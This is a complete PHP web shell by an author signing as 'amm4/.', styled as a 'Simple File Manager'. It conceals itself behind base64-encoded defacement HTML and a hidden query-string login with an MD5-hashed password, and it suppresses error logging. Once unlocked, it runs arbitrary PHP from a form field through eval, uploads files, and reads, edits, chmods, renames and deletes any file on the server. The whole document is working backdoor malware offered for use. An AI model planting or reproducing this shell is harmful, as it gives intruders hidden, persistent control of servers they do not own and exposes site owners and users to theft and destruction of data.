<?php

session_start();@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@set_time_limit(0);




$key = '4107a98c69dac5317a72ff8a369cf417';


if(!isset($_SESSION['login'])){
if($_SERVER['QUERY_STRING']=='login'){
$_SESSION['login']='true';
 }
}


if(!isset($_SESSION['login'])){
$depes='PCFEb2N0eXBlIGh0bWw+DQo8aGVhZD4NCjwhLS0NCmFtbTRXYXNoZXJlIHwgTm9OZWVkTmFtZQ0KDQppdCdzIG5vdCBoYWNraW5nLi4uDQpJbSBub3QgaGFja2VyLi4uDQpJIGp1c3QgbGVhdmUgbXkgbmFtZSAuLi4NCkltIHNvIHNvcnJ5IGlmIHlvdSBnZXQgdGVycmlibGUgYWJvdXQgaXQuLg0KLS0+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSIgLz4NCjxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0iaW5kZXgsZm9sbG93IiAvPg0KPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlNvIHNvcnJ5LCBhbW00Ly4gV2FzIGhlcmUuLi4hIEl0IGJlY2F1c2UgeW91IGRpZG4ndCBoYXZlIGluZGV4IGZpbGUsIHNvIGkgbWFkZSBpdC4uLiBKdXN0IHRha2UgaXQgZWFzeSA6RCIgLz4NCjxtZXRhIG5hbWU9Imdvb2dsZWJvdCIgY29udGVudD0iaW5kZXgsZm9sbG93IiAvPg0KPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJhbGwiIC8+DQo8bWV0YSBuYW1lPSJyb2JvdHMgc2NoZWR1bGUiIGNvbnRlbnQ9ImF1dG8iIC8+DQo8bWV0YSBuYW1lPSJkaXN0cmlidXRpb24iIGNvbnRlbnQ9Imdsb2JhbCIgLz4NCjx0aXRsZT5hbW00Ly4gV2FzIGhlcmU8L3RpdGxlPg0KDQo8c2NyaXB0Pg0KYWxlcnQoJ2FtbTQvLiBXYXMgaGVyZSA6cCA6diAnKTsgDQp2YXIgbXlBcnJheSAgPSBbJ2kuaW1ndXIuY29tL08wb0JWTDgucG5nJyAsICc0LmJwLmJsb2dzcG90LmNvbS8tM2c5c2xMS1JXOTgvVV9KNHBaMk1TRUkvQUFBQUFBQUFXU2cvYUVDUm9oYTVhSkkvczAvbG9sLnBuZycsJ2RhdGEud2hpY2RuLmNvbS9pbWFnZXMvOTI5NTY2MzAvbGFyZ2UucG5nJywnb3JpZzExLmRldmlhbnRhcnQubmV0L2UyYTAvZi8yMDEzLzIzMC9iLzgvZ2ludGFtYV9yYWJiaXRfcmVuZGVyX2J5X3Nha3VyYWhhbmFiaWZvcmV2ZXItZDZpcHZ5cC5wbmcnLCdpbWcwNC5kZXZpYW50YXJ0Lm5ldC9jMDJiL2kvMjAxNS8yNTEvMC81L2thZ3VyYV9fX3JlbmRlcl9fNjRfYnlfZnVyaXlhX3NhbWEtZDk4dmp0ay5wbmcnXTsNCg0KdmFyIHJhbmQgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqbXlBcnJheS5sZW5ndGgpOyANCg0KdmFyICBjb25jYXQgID0gICBteUFycmF5W3JhbmRdOyANCmZ1bmN0aW9uIHByaW50KCl7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaW1nJykuaW5uZXJIVE1MPSAnPGNlbnRlcj48aW1nIHNyYz1cImh0dHA6Ly8nK2NvbmNhdCsnXCIgYWx0PVwiYW1tNC8uIFdhcyBoZXJlXCIgLz48L2NlbnRlcj4nOw0KfQ0KPC9zY3JpcHQ+DQoNCg0KPHN0eWxlPiANCmJvZHl7DQpiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyBzaXplOjIwcHg7IGNvbG9yOiBncmVlbjsgDQp9DQppbWd7DQpwYWRkaW5nOjRweDsNCm1hcmdpbjo4cHg7DQptYXgtd2lkdGg6OTAlOw0Kd2lkdGg6YXV0bzsNCmhlaWdodDphdXRvOw0KfQ0KI2gxew0KDQpjb2xvcjpncmVlbjsNCmZvbnQtc2l6ZTo1MHB4Ow0KdGV4dC1hbGlnbjpjZW50ZXI7DQp9DQoNCiNoMnsNCg0KY29sb3I6cmVkOw0KdGV4dC1hbGlnbjpjZW50ZXI7DQp9DQpocnsNCmNvbG9yOmdyZWVuOw0KfQ0KYXsNCmNvbG9yOnJlZDsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9InByaW50KCk7Ij4NCiAgDQoNCg0KDQo8ZGl2IGlkPSAiaW1nIj48L2Rpdj48YnIvPg0KDQo8ZGl2IGlkPSJoMSI+YW1tNC8uIFdhcyBoZXJlPC9kaXY+DQo8aHIgLz4NCiANCjxkaXYgaWQ9ImgyIj48YSBocmVmPSJodHRwczovL3d3dy5kZWZhY2VyLmlkL2hhY2tlci9hbW00V2FzaGVyZS5odG1sIj4gLS0tLSMgYW1tNFdhc2hlcmUgfCBOb05lZWROYW1lICMtLS0tIDwvYT48L2Rpdj4NCjxiciAvPg0KDQogPC9ib2R5Pg0KPC9odG1sPg==';
echo base64_decode($depes);
exit;
}



$pass = $_POST['pass'];

if($_POST['pass']){
$pass_k = md5('_'.$pass.'_');
if($pass_k == $key){
$_SESSION[$key]= $pass;
  }
}

if(!isset($_SESSION[$key])){
$loG ='PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ij4NCjx0aXRsZT4uLi4uOjo6OiMgYW1tNC8uIFdhcyBoZXJlIHwgcGxlYXNlIGxvZ2luICEgOnAgIzo6OjouLi4uPC90aXRsZT4NCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQo8c3R5bGU+aW1ne21heC13aWR0aDo5MCU7d2lkdGg6YXV0bztoZWlnaHQ6YXV0bztwYWRkaW5nOjRweDttYXJnaW46NnB4O308L3N0eWxlPjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrO2NvbG9yOnJlZCIgPjxjZW50ZXI+DQo8aW1nIHNyYz0iaHR0cDovLzQuYnAuYmxvZ3Nwb3QuY29tLy0zZzlzbExLUlc5OC9VX0o0cFoyTVNFSS9BQUFBQUFBQVdTZy9hRUNSb2hhNWFKSS9zMC9sb2wucG5nIj4NCjxiciAvPg0KICAgIDxzdHlsZT4NCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiM0OWNjMDA7Ym9yZGVyOjRweCBzb2xpZCAjOGU4ZThlOyB9DQogICAgPC9zdHlsZT4NCiAgICANCiAgICA8Zm9ybSBpZD0ibG9naW4iIG1ldGhvZD0icG9zdCI+PGlucHV0IGF1dG9jb3JyZWN0PSJvZmYiIGF1dG9jYXBpdGFsaXplPSJvZmYiIG5hbWU9InBhc3MiIHR5cGU9InBhc3N3b3JkIiAvPjxici8+DQo8aW5wdXQgdmFsdWU9IkxvZ2luIiBzdHlsZT0iY29sb3I6IzAyZjhmZTtiYWNrZ3JvdW5kLWNvbG9yOiM1MzUzNTM7cGFkZGluZzozcHggNnB4OyIgdHlwZT0ic3VibWl0IiBuYW1lPSJsb2dpbiI+PC9mb3JtPjxiciAvPjxwPjwvcD5ieTogYW1tNC8uPC9jZW50ZXI+';
echo base64_decode($loG);

exit();

}




function epal(){
echo'<form method="post"><textarea name="epal"></textarea><br/><input type="submit" name="ev" value="eval gan!" /></form>';
if($_POST['epal']){
eval($_POST['epal']);
 }
}

function tgm($f){
return gmdate("d F Y H:i:s.",filemtime($f)+7*3600);
}

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Amm4/. Simple File Manager</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: white;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: white;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color:  red;
}
#content .first:hover{
background-color:  red;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: red;
text-decoration: none;
}
a:hover{
color: red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<br><br><table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload Done ~_^ .</font><br />';
}else{
echo '<font color="red">File Upload Error ~_~.</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form><br/>';
epal();
echo'</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(highlight_string(file_get_contents($_GET['filesrc'])));
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done ~_^.</font><br />';
}else{
echo '<font color="red">Edit File Error ~_~.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Date mod</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td><td><center>".tgm("$path/$dir")."</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td><td><center>".tgm("$path/$file")."</center></td><td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center> <font color="red"></font>, <font color="red"></font></center>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
